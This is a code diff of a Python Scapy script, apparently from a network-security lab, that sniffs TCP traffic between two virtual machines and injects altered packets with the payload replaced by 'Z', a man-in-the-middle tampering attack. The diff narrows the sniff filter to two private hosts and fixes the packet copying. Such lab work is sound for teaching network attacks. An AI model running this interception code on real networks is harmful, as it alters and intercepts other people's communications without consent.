@@ -11,8 +11,10 @@ VM_B_MAC = '08:00:27:14:ac:04'
 
 
 def spoof_pkt(pkt):
-    if pkt[IP].src == VM_A_IP and pkt[IP].dst == VM_B_IP and pkt[TCP].payload:
-        newpkt = pkt[IP]
+    if pkt[IP].src == VM_A_IP \
+            and pkt[IP].dst == VM_B_IP \
+            and pkt[TCP].payload:
+        newpkt = pkt[IP].copy()
         del newpkt.chksum
         del newpkt[TCP].chksum
         del newpkt[TCP].payload
@@ -21,7 +23,8 @@ def spoof_pkt(pkt):
         # updated code lines, instead of line : " newdata = 'Z' "
 
         olddata = olddata.decode()
-        data = re.sub(r'a-zA-Z', r'Z', olddata)
+        # data = re.sub(r'a-zA-Z', r'Z', olddata)
+        data = "Z"
         newdata = data.encode()
 
         # End of updated code lines
@@ -31,4 +34,4 @@ def spoof_pkt(pkt):
         send(pkt[IP])  # Forward the original packet
 
 
-pkt = sniff(filter='tcp', prn=spoof_pkt)
+pkt = sniff(filter='tcp and src host 192.168.1.67 and dst host 192.168.1.70', prn=spoof_pkt)
